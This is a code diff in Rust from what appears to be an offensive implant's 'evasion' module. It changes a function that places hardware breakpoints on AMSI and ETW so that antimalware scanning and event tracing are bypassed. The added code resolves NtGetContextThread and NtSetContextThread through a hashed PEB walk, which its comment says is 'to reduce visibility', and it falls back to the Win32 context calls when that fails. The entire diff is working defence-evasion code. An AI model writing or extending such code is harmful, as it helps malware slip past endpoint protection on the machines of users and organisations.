@@ -344,14 +344,75 @@ pub unsafe fn apply_hwbp_to_current_thread() {
         return; // HWBPs not yet configured; skip silently
     }
 
+    // Resolve Nt* context variants from ntdll via PEB walk to reduce
+    // visibility (same pattern as setup_hardware_breakpoints).
+    type NtGetContextThreadFn =
+        unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;
+    type NtSetContextThreadFn =
+        unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;
+
+    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0);
+    let nt_get_ctx: Option<NtGetContextThreadFn> = if ntdll != 0 {
+        pe_resolve::get_proc_address_by_hash(
+            ntdll,
+            pe_resolve::hash_str(b"NtGetContextThread\0"),
+        )
+        .map(|a| std::mem::transmute(a))
+    } else {
+        None
+    };
+    let nt_set_ctx: Option<NtSetContextThreadFn> = if ntdll != 0 {
+        pe_resolve::get_proc_address_by_hash(
+            ntdll,
+            pe_resolve::hash_str(b"NtSetContextThread\0"),
+        )
+        .map(|a| std::mem::transmute(a))
+    } else {
+        None
+    };
+
+    if nt_set_ctx.is_none() {
+        log::warn!(
+            "evasion: apply_hwbp_to_current_thread: SetThreadContext fallback path in use for debug register modification"
+        );
+    }
+
     let mut ctx: CONTEXT = std::mem::zeroed();
     ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
     let h = GetCurrentThread();
-    if GetThreadContext(h, &mut ctx) != 0 {
+
+    let got_ctx = if let Some(nt_get) = nt_get_ctx {
+        let status = nt_get(h, &mut ctx);
+        if status < 0 {
+            log::warn!(
+                "evasion: apply_hwbp_to_current_thread: NtGetContextThread failed (status=0x{:08x}), falling back to GetThreadContext",
+                status as u32
+            );
+            GetThreadContext(h, &mut ctx) != 0
+        } else {
+            true
+        }
+    } else {
+        GetThreadContext(h, &mut ctx) != 0
+    };
+
+    if got_ctx {
         ctx.Dr0 = amsi as u64;
         ctx.Dr1 = etw as u64;
         ctx.Dr7 |= (1 << 0) | (1 << 2); // enable local breakpoints for Dr0 and Dr1
-        SetThreadContext(h, &ctx);
+
+        if let Some(nt_set) = nt_set_ctx {
+            let status = nt_set(h, &mut ctx);
+            if status < 0 {
+                log::warn!(
+                    "evasion: apply_hwbp_to_current_thread: NtSetContextThread failed (status=0x{:08x}), falling back to SetThreadContext",
+                    status as u32
+                );
+                SetThreadContext(h, &ctx);
+            }
+        } else {
+            SetThreadContext(h, &ctx);
+        }
     }
 }
 
